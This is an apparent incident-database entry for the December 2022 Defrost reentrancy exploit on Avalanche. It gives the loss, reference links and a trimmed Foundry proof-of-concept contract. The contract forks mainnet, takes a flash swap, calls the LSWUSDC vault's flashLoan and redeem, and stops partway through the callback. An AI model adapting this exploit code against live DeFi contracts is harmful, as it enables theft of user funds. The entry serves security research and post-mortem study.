# [?] - Defrost - Reentrancy

## Summary
Severity: Unknown
Chain: Avalanche
Component: Defrost
Published: 2022-12-23
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Defrost_exp.sol
Type: defi-exploit-poc

## Details
Lost: $170k
References:
- https://twitter.com/PeckShieldAlert/status/1606276020276891650
- https://snowtrace.io/tx/0xc6fb8217e45870a93c25e2098f54f6e3b24674a3083c30664867de474bf0212d

```solidity
contract ContractTest is Test {
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    LSWUSDC LSW = LSWUSDC(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
    uint256 flashLoanAmount;
    uint256 flashLoanFee;
    uint256 depositAmount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("avalanche", 24_003_940);
    }

    function testExploit() public {
        flashLoanAmount = LSW.maxFlashLoan(address(USDC));
        flashLoanFee = LSW.flashFee(address(USDC), flashLoanAmount);
        Pair.swap(0, flashLoanAmount + flashLoanFee, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);
    }

    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        LSW.flashLoan(address(this), address(USDC), flashLoanAmount, new bytes(1));
        LSW.redeem(depositAmount, address(this), address(this));
        USDC.transfer(address(Pair), (flashLoanAmount + flashLoanFee) * 1000 / 997 + 1000);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Defrost_exp.sol_
